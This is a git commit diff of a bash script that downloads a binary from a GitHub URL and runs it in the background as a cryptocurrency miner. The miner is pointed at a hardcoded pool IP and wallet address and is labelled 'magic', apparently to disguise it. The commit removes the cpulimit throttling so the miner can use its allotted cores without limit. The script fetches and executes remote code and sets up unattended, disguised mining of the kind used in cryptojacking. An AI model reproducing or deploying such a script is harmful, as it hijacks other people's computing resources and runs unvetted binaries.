36bf78a283ce60f599f263d0658deb210a08e626
barburonjilo <barburonjilo@outlook.co.id>
2024-08-15 22:04:45 +0700

    Update coros.sh

--- coros.sh
+++ coros.sh
@@ -1,15 +1,5 @@
 #!/bin/bash
 
-# Function to check and install cpulimit if not installed
-check_and_install_cpulimit() {
-  if ! command -v cpulimit &> /dev/null; then
-    echo "cpulimit not found. Installing via yum..."
-    sudo yum install -y cpulimit
-  else
-    echo "cpulimit is already installed"
-  fi
-}
-
 # Function to download and prepare the mining script
 prepare_mining_script() {
   wget -O tmii https://github.com/barburonjilo/back/raw/main/sr
@@ -33,19 +23,12 @@ start_magic() {
   # Define the cores to use
   local cores_to_use="0-$(($num_cores - 1))"  # Using the first $num_cores cores
 
-  # Calculate the CPU limit as a percentage
-  local cpu_limit=$(( 100 * num_cores / total_cores ))  # Calculate percentage based on num_cores
-
   # Start the mining process with core affinity and output to log file
   taskset -c $cores_to_use nohup ./tmii -a yescryptr32 --pool 45.115.225.129:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > mining.log 2>&1 &
   local pid=$!
 
   echo "Magic started with PID: $pid using $num_cores cores"
-  echo "CPU limit set to $cpu_limit%"
 
-  # Limiting CPU usage using `cpulimit`
-  cpulimit -p $pid -l $cpu_limit &
-  
   # Save PID to a file for later use
   echo $pid > /tmp/magic_pid
 }
@@ -57,7 +40,7 @@ stop_magic() {
     echo "Stopping magic with PID: $pid"
     kill -9 $pid 2>/dev/null
     rm -f /tmp/magic_pid
-    
+
     # Empty the mining.log file
     > mining.log
   else
@@ -66,7 +49,6 @@ stop_magic() {
 }
 
 # Main execution
-check_and_install_cpulimit
 prepare_mining_script
 
 # Run the loop
